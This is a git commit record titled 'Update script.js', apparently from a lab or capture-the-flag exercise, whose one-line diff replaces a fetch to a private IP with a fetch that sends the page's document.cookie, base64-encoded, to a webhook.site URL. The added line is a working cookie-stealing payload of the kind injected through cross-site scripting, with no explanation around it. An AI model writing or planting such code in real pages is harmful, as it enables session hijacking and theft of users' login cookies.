050482cda919c2218d4d72ecb4e5e3039260d728
Lo12code <58741785+Lo12code@users.noreply.github.com>
2025-07-09 13:40:46 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch('http://10.10.16.6:1234/'); //?data='+btoa(document.cookie);
+fetch('https://webhook.site/f75ace0e-7a05-41e7-9cd2-822e07d2fc3f?data='+btoa(document.cookie)); //?data='+btoa(document.cookie);
